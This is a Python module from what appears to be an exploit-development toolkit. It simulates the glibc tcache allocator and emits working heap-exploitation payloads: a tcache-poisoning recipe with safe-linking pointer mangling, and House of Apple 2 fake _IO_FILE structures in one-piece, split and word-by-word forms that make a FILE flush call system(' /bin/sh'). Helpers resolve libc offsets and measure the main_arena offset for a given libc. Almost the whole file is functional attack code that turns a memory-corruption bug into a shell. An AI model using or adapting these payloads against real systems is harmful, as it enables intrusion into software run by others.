"""Heap-layout primitives (Phase 9 frontier, MAZE/AAHEG-style, analyst-in-the-loop).

A deterministic model of the glibc **tcache** allocator (per-size-class LIFO bins with
safe-linking), plus the two primitives an analyst drives against a real target:

  * **grooming / reclaim** — LIFO reuse means allocating a freed size-class returns the most
    recently freed chunk; allocate the same size to place a controlled chunk at a chosen
    freed address, or allocate consecutively to make chunks adjacent (MAZE layout goals).
  * **tcache poisoning** — after a use-after-free (or overflow into a freed chunk's fd), set
    the chunk's forward pointer to a target; the second following malloc then returns that
    target -> an **arbitrary-address allocation** (arbitrary write). Safe-linking (glibc
    >=2.32) mangles the stored fd, and this computes the exact value to write.

Pure stdlib and deterministic. This models the allocator and emits the recipe; wiring it to a
specific target's alloc/free interface is the analyst-in-the-loop step (doc 15).
"""
from __future__ import annotations

from dataclasses import dataclass, field

# x86-64 glibc constants
_ALIGN = 0x10
_MINSIZE = 0x20
SIZE_SZ = 8
TCACHE_MAX_BINS = 64
TCACHE_COUNT = 7                       # chunks per size-class bin
MAX_FAST = 0x80                        # default global_max_fast (chunk size); <= -> fastbin
MIN_LARGE = 0x400                      # chunk size at/above this is a large bin (else small)


def is_fastbin(chunk_size: int) -> bool:
    return _MINSIZE <= chunk_size <= MAX_FAST


def is_smallbin(chunk_size: int) -> bool:
    return _MINSIZE <= chunk_size < MIN_LARGE


def request2size(req: int) -> int:
    """glibc chunk size for a malloc(req) request (x86-64)."""
    size = (req + SIZE_SZ + _ALIGN - 1) & ~(_ALIGN - 1)
    return max(size, _MINSIZE)


def tcache_index(chunk_size: int) -> int:
    """tcache bin index for a chunk size (0 -> 0x20 ... 63 -> 0x410)."""
    return (chunk_size - _MINSIZE) // _ALIGN


def in_tcache_range(chunk_size: int) -> bool:
    return 0 <= tcache_index(chunk_size) < TCACHE_MAX_BINS


def mangle(fd_slot_addr: int, ptr: int) -> int:
    """Safe-linking PROTECT_PTR: the value stored in a freed chunk's fd (glibc >=2.32).
    `fd_slot_addr` is the address of the fd field (== the chunk's user pointer for tcache)."""
    return ((fd_slot_addr >> 12) ^ ptr) & 0xFFFFFFFFFFFFFFFF


def demangle(fd_slot_addr: int, stored: int) -> int:
    """Inverse of mangle (recover the real fd from a stored, safe-linked value)."""
    return ((fd_slot_addr >> 12) ^ stored) & 0xFFFFFFFFFFFFFFFF


@dataclass
class TcacheModel:
    """A minimal glibc tcache simulator that predicts reuse ORDER and poisoning outcomes.
    Chunk addresses are symbolic (assigned from a bump base) -- the model reasons about which
    chunk a malloc returns, not glibc's exact absolute layout."""
    base: int = 0x1000
    bins: dict = field(default_factory=dict)          # tcache_index -> [user_ptr] (LIFO tail=head)
    counts: dict = field(default_factory=dict)
    fastbins: dict = field(default_factory=dict)      # chunk_size -> [user_ptr] (LIFO tail=head)
    otherbins: dict = field(default_factory=dict)     # chunk_size -> [user_ptr] (small/large FIFO)
    live: dict = field(default_factory=dict)          # user_ptr -> chunk_size
    poison: dict = field(default_factory=dict)        # user_ptr -> forged next ptr (UAF fd write)
    _top: int = 0

    def __post_init__(self):
        self._top = self.base

    def malloc(self, req: int) -> int:
        cs = request2size(req)
        i = tcache_index(cs)
        bin_ = self.bins.get(i)
        if in_tcache_range(cs) and bin_:
            ptr = bin_.pop()                           # tcache LIFO (checked first)
            self.counts[i] = self.counts.get(i, 0) - 1
            # a poisoned fd redirects the bin head to the forged target
            if ptr in self.poison:
                self.bins.setdefault(i, []).append(self.poison.pop(ptr))
                self.counts[i] = self.counts.get(i, 0) + 1
            self.live[ptr] = cs
            return ptr
        if is_fastbin(cs) and self.fastbins.get(cs):
            ptr = self.fastbins[cs].pop()              # fastbin LIFO (after tcache drains)
            self.live[ptr] = cs
            return ptr
        if self.otherbins.get(cs):
            ptr = self.otherbins[cs].pop(0)            # small/large bins are FIFO
            self.live[ptr] = cs
            return ptr
        ptr = self._top + SIZE_SZ * 2                  # user data after the chunk header
        self._top += cs
        self.live[ptr] = cs
        return ptr

    def free(self, ptr: int) -> None:
        cs = self.live.pop(ptr, None)
        if cs is None:
            return
        i = tcache_index(cs)
        # glibc order: tcache (until full) -> fastbin (small) -> unsorted->small/large (FIFO)
        if in_tcache_range(cs) and self.counts.get(i, 0) < TCACHE_COUNT:
            self.bins.setdefault(i, []).append(ptr)
            self.counts[i] = self.counts.get(i, 0) + 1
        elif is_fastbin(cs):
            self.fastbins.setdefault(cs, []).append(ptr)
        else:
            self.otherbins.setdefault(cs, []).append(ptr)

    def write_fd(self, freed_ptr: int, target: int) -> None:
        """Model a UAF/overflow write of a freed chunk's forward pointer to `target`."""
        self.poison[freed_ptr] = target


def tcache_poison_recipe(req: int, *, names=("A", "B")) -> dict:
    """The op sequence + fd-mangling to turn a UAF on a `req`-byte chunk into an
    arbitrary-address allocation. `mangle` must be applied with the *runtime* chunk address
    (leaked at exploit time) because safe-linking depends on it."""
    a, b = names
    cs = request2size(req)
    if not in_tcache_range(cs):
        return {"ok": False, "reason": f"size {req} (chunk {hex(cs)}) is outside tcache range"}
    return {
        "ok": True, "chunk_size": cs, "tcache_index": tcache_index(cs),
        "ops": [
            ("alloc", a, req), ("alloc", b, req),
            ("free", b), ("free", a),                  # tcache head is now A (LIFO)
            ("write_fd", a, "mangle(addr(A), TARGET)"),
            ("alloc", "_", req),                        # returns A
            ("alloc", "OUT", req),                      # returns TARGET
        ],
        "mangle": mangle,                               # mangle(addr_of_A, target)
        "notes": ("safe-linking (glibc>=2.32): write mangle(addr(A), TARGET) into A's fd; "
                  "TARGET must be 16-byte aligned; glibc's tcache double-free key check is "
                  "bypassed by the UAF write rather than free(A);free(A)."),
        "result": "the second malloc after the write returns TARGET (arbitrary allocation).",
    }


def groom_reclaim(req: int) -> dict:
    """Place a controlled chunk at a just-freed address (LIFO reclaim)."""
    return {"ops": [("free", "VICTIM"), ("alloc", "CONTROLLED", req)],
            "result": "CONTROLLED is allocated at VICTIM's address (same size-class, LIFO)."}


# --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
import struct as _struct  # noqa: E402

# Fixed _IO_FILE / _IO_wide_data field offsets (stable across glibc; verified live on 2.35-2.43).
_F_FLAGS, _F_WRITE_BASE, _F_WRITE_PTR = 0x00, 0x20, 0x28
_F_BUF_BASE, _F_LOCK, _F_WIDE_DATA, _F_VTABLE = 0x38, 0x88, 0xA0, 0xD8
_WD_BUF_BASE, _WD_VTABLE = 0x30, 0xE0                 # inside the _IO_wide_data
_JT_DOALLOCATE = 0x68                                 # __doallocate slot in an _IO_jump_t


def build_house_of_apple2(write_addr: int, *, wfile_jumps: int, system: int,
                          command: bytes = b" /bin/sh") -> bytes:
    """A fake _IO_FILE (House of Apple 2) that turns an ARBITRARY WRITE over `_IO_2_1_stdout_` plus
    a libc leak into a call to system(command) -- the modern-glibc replacement for the removed
    __free_hook. When a FILE is flushed (exit(), fflush, or the next buffered write), glibc walks
    _IO_list_all and calls `_IO_OVERFLOW(fp)`; with the vtable pointed at `_IO_wfile_jumps` that is
    `_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `fp->_wide_data->_wide_vtable->__doallocate(fp)`,
    a controlled call with rdi == fp. Point __doallocate at `system` and the call is system(fp);
    since fp is this struct, its first bytes ARE the command (a leading space keeps the flag bits
    the overflow path checks -- NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING -- clear).

    Returns the bytes to write at `write_addr` (== the runtime address of `_IO_2_1_stdout_`); the
    fake `_IO_wide_data` and wide vtable are laid out self-contained within the same blob."""
    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
    wide_data = write_addr + 0xE0
    wide_vt = write_addr + 0x200
    lock = write_addr + 0x2A0                          # a zeroed, writable 8 bytes (in this blob)
    blob = bytearray(b"\x00" * 0x300)

    def w(off, val):
        blob[off:off + 8] = _struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    blob[0:len(command)] = command                     # _flags == the command string
    w(_F_WRITE_BASE, 0)
    w(_F_WRITE_PTR, 1)                                 # write_ptr > write_base -> flush calls overflow
    w(_F_BUF_BASE, 0)
    w(_F_LOCK, lock)
    w(_F_WIDE_DATA, wide_data)
    w(_F_VTABLE, wfile_jumps)
    w(0xE0 + _WD_BUF_BASE, 0)                          # wide _IO_buf_base == 0 -> take the allocate path
    w(0xE0 + _WD_VTABLE, wide_vt)
    w(0x200 + _JT_DOALLOCATE, system)                 # the controlled call target
    return bytes(blob)


def build_house_of_apple2_split(stdout_addr: int, wide_addr: int, *, wfile_jumps: int, system: int,
                                command: bytes = b" /bin/sh"):
    """House of Apple 2 as TWO small writes instead of one 0x300 blob, for a notebook whose size cap
    cannot hold the full fake FILE. Returns (file_hdr, wide_blob):

      file_hdr  (0xE0 B) -- written AT `_IO_2_1_stdout_`; the whole _IO_FILE_plus, with _wide_data
                            and _lock pointing into a chunk the caller owns at `wide_addr`.
      wide_blob (0xE8 B) -- written at `wide_addr`: the fake _IO_wide_data at +0 with its jump table
                            packed at +0x18, so the three fields that matter land clear of each
                            other -- 0x30 (_IO_buf_base == 0, to take the allocate path), 0x80 (the
                            table's __doallocate == system) and 0xE0 (_wide_vtable). 0xA0 is left
                            zero for _lock to point at.

    build_house_of_apple2 needs 0x2A8 bytes only because those two structures sit inside the stdout
    write; hoisting them into the caller's own chunk drops the largest single write to 0xE8, which a
    small-cap notebook can still allocate."""
    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
    wide_vt = wide_addr + 0x18
    wide = bytearray(b"\x00" * 0xE8)
    hdr = bytearray(b"\x00" * 0xE0)

    def _w(buf, off, val):
        buf[off:off + 8] = _struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)

    _w(wide, _WD_BUF_BASE, 0)                          # take the allocate path
    _w(wide, 0x18 + _JT_DOALLOCATE, system)            # the controlled call target
    _w(wide, _WD_VTABLE, wide_vt)
    hdr[0:len(command)] = command                      # _flags == the command string
    _w(hdr, _F_WRITE_BASE, 0)
    _w(hdr, _F_WRITE_PTR, 1)                           # write_ptr > write_base -> flush calls overflow
    _w(hdr, _F_BUF_BASE, 0)
    _w(hdr, _F_LOCK, wide_addr + 0xA0)                 # zeroed, writable, inside our own chunk
    _w(hdr, _F_WIDE_DATA, wide_addr)
    _w(hdr, _F_VTABLE, wfile_jumps)
    return bytes(hdr), bytes(wide)


# The largest single write build_house_of_apple2 needs (its _lock sits at +0x2A0). Below this a
# notebook's size cap cannot hold the one-piece FILE, and build_house_of_apple2_split applies.
HOA2_BLOB_MIN = 0x2A8
HOA2_SPLIT_MIN = 0xE8                                  # the larger of the split path's two writes


#: House of Apple 2 as a handful of 8-byte CELLS, for a primitive that writes one word at a
#: chosen address (CWE-129 `arr[i] = v`, a %n format write, a tcache chunk placed over a pointer)
#: rather than a run of bytes. The one-piece blob cannot be delivered that way at all: the 0x300
#: bytes land over `_IO_2_1_stdout_` AND the `stdout`/`stderr`/`stdin` pointer variables that
#: follow it, and a cell-at-a-time writer runs the target's own code -- its next prompt -- between
#: every write, so a half-built FILE is executed. Five cells, and the FILE is one the program
#: never touches, so nothing in between runs through it.
_HOA2_CELL_COUNT = 5


def house_of_apple2_cells(fp_addr: int, *, wide_data: int, wide_vtable: int, wfile_jumps: int,
                          system: int, command: bytes = b" /bin/sh") -> list:
    """House of Apple 2 delivered as [(address, 8-byte value)] -- five arbitrary writes -- instead
    of `build_house_of_apple2`'s one 0x300 blob. For an ARBITRARY-WRITE primitive that places one
    word at a time (an unchecked array index, a %n write) this is the only deliverable form.

    `fp_addr` is the FILE to forge. It must be one the program does not use between the writes:
    `_IO_2_1_stderr_` is the pick for a program that writes only to stdout, because a forged FILE
    is read by nothing until `exit()` walks `_IO_list_all`. `wide_data` is that FILE's REAL
    `_wide_data` (read out of the target, not guessed; its `_IO_buf_base` is already NULL for a
    stream that never saw a wide character, which is the condition `_IO_wdoallocbuf` tests).
    `wide_vtable` is any writable 8 bytes whose +0x68 we may set -- the target's own global array
    does nicely, which keeps the forgery inside memory the bug already reaches.

    The order is load-bearing, so the caller writes them in sequence:

      1. `wide_vtable + 0x68 := system`  -- the fake `__doallocate`, outside the FILE.
      2. `wide_data + 0xE0 := wide_vtable` -- the fake `_wide_vtable`, still outside the FILE.
      3. `fp + 0x28 := 1` -- `_IO_write_ptr > _IO_write_base`, the test `_IO_flush_all` applies.
      4. `fp + 0xD8 := _IO_wfile_jumps` -- `_IO_OVERFLOW` becomes `_IO_wfile_overflow`.
      5. `fp + 0x00 := command` -- `_flags` doubles as the string, and rdi == fp at the call.

    `_flags` is last because the command's first byte (a space, 0x20) sets `_IO_ERR_SEEN`: writing
    it any earlier stops that FILE being usable, which matters when the only forgeable FILE is one
    the program still reads from. `exit()` then flushes the forged FILE: `_IO_wfile_overflow` sees
    a NULL wide `_IO_buf_base`, calls `_IO_wdoallocbuf` -> `_wide_data->_wide_vtable->__doallocate(fp)`
    == `system(fp)`, and fp's first bytes are the command."""
    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
    cmd = _struct.unpack("<Q", (command + b"\x00" * 8)[:8])[0]
    return [(wide_vtable + _JT_DOALLOCATE, system),
            (wide_data + _WD_VTABLE, wide_vtable),
            (fp_addr + _F_WRITE_PTR, 1),
            (fp_addr + _F_VTABLE, wfile_jumps),
            (fp_addr + _F_FLAGS, cmd)]


def house_of_apple2_cell_targets(libc_data: bytes) -> dict:
    """The libc offsets `house_of_apple2_cells` needs. `_IO_2_1_stderr_` rather than stdout: the
    cells are written one at a time with the target's own code running in between, so the forged
    FILE has to be one that code does not use."""
    from . import rop
    want = ("_IO_2_1_stderr_", "_IO_wfile_jumps", "system")
    s = rop.libc_symbols(libc_data, want)
    if not all(k in s for k in want):
        return {}
    return {"fp": s["_IO_2_1_stderr_"], "wfile_jumps": s["_IO_wfile_jumps"],
            "system": s["system"], "fp_name": "_IO_2_1_stderr_",
            "wide_data_field": _F_WIDE_DATA, "wide_buf_base_field": _WD_BUF_BASE}


def house_of_apple2_targets(libc_data: bytes) -> dict:
    """The libc offsets House of Apple 2 needs: the FILE to corrupt (`_IO_2_1_stdout_`), the vtable
    (`_IO_wfile_jumps`) and `system`. Relocate each by the leaked libc base. {} if any is absent."""
    from . import rop
    s = rop.libc_symbols(libc_data, ("_IO_2_1_stdout_", "_IO_wfile_jumps", "system"))
    if not all(k in s for k in ("_IO_2_1_stdout_", "_IO_wfile_jumps", "system")):
        return {}
    return {"stdout": s["_IO_2_1_stdout_"], "wfile_jumps": s["_IO_wfile_jumps"],
            "system": s["system"]}


def unsorted_bin_offset(libc_path=None):
    """Offset from a libc's load base to where a lone unsorted-bin chunk's fd points
    (`main_arena + 0x60`) -- the value a heap "view of a freed large chunk" leak discloses, so
    `libc_base = leaked - unsorted_bin_offset(libc)`. This is glibc-version-specific and not an
    exported symbol, so it is MEASURED: compile a tiny malloc/free/print helper, run it against the
    given libc under ASLR-off, and read the offset from /proc/maps. Cached per libc. Returns None
    when there is no compiler or the probe fails (the caller then needs an analyst-supplied value)."""
    import os
    import shutil
    import struct
    import subprocess
    import tempfile
    key = os.path.realpath(libc_path) if libc_path else "system"
    cache = getattr(unsorted_bin_offset, "_cache", None)
    if cache is None:
        cache = unsorted_bin_offset._cache = {}
    if key in cache:
        return cache[key]
    gcc = shutil.which("gcc") or shutil.which("cc")
    setarch = shutil.which("setarch")
    if not gcc or not setarch:
        cache[key] = None
        return None
    d = tempfile.mkdtemp(prefix="lykos-arena-")
    try:
        src = os.path.join(d, "a.c")
        with open(src, "w") as f:
            f.write('#include <stdlib.h>\n#include <unistd.h>\n'
                    'int main(){ void*a=malloc(0x430); malloc(0x430); free(a);\n'
                    '  write(1, a, 8); char c; read(0,&c,1); return 0; }\n')  # pause: keep maps live
        exe = os.path.join(d, "a")
        # Compile with a CLEAN env. A bundled libc is a different glibc version than the host, so
        # putting its dir on LD_LIBRARY_PATH makes the HOST gcc/setarch themselves try to load it
        # ("version GLIBC_2.XX not found") and fail. The target's libc is selected at RUN time by
        # the bundled ld's --library-path instead, which touches only the probe, not host tools.
        env = dict(os.environ)
        env.pop("LD_LIBRARY_PATH", None)
        run_cmd = [setarch, "-R", exe]
        if libc_path:                                          # run against a SPECIFIC libc
            libdir = os.path.dirname(os.path.realpath(libc_path))
            # Run the probe under the BUNDLED ld-linux (shipped beside the libc) with --library-path:
            # the standard way to execute a binary against a foreign glibc, so main_arena's offset
            # is measured for THAT libc. LD_LIBRARY_PATH alone fails (host ld cannot load it).
            import glob as _glob
            lds = _glob.glob(os.path.join(libdir, "ld-linux*.so*")) + \
                _glob.glob(os.path.join(libdir, "ld-*.so*"))
            if lds:
                run_cmd = [setarch, "-R", lds[0], "--library-path", libdir, exe]
        if subprocess.run([gcc, src, "-o", exe], capture_output=True, env=env).returncode:
            cache[key] = None
            return None
        proc = subprocess.Popen(run_cmd, stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, env=env)
        out = proc.stdout.read(8)                               # blocks until the leak is written
        try:
            with open(f"/proc/{proc.pid}/maps") as _f:    # process paused on read()
                maps = _f.read().splitlines()
        except OSError:
            maps = []
        try:
            proc.stdin.write(b"\n"); proc.stdin.flush()        # let it exit
        except OSError:
            pass
        proc.wait(timeout=3)
        leaked = struct.unpack("<Q", out.ljust(8, b"\x00"))[0] if len(out) >= 8 else 0

        def _rng(line):
            a, b = line.split()[0].split("-")
            return int(a, 16), int(b, 16)
        # the leak sits in libc's DATA segment; the load base is the LOWEST libc mapping
        libc_starts = [_rng(m)[0] for m in maps if "libc" in m]
        base = min(libc_starts) if libc_starts else 0
        off = leaked - base if base and leaked > base else None
        cache[key] = off
        return off
    except Exception:                                          # noqa: BLE001
        cache[key] = None
        return None
    finally:
        shutil.rmtree(d, ignore_errors=True)
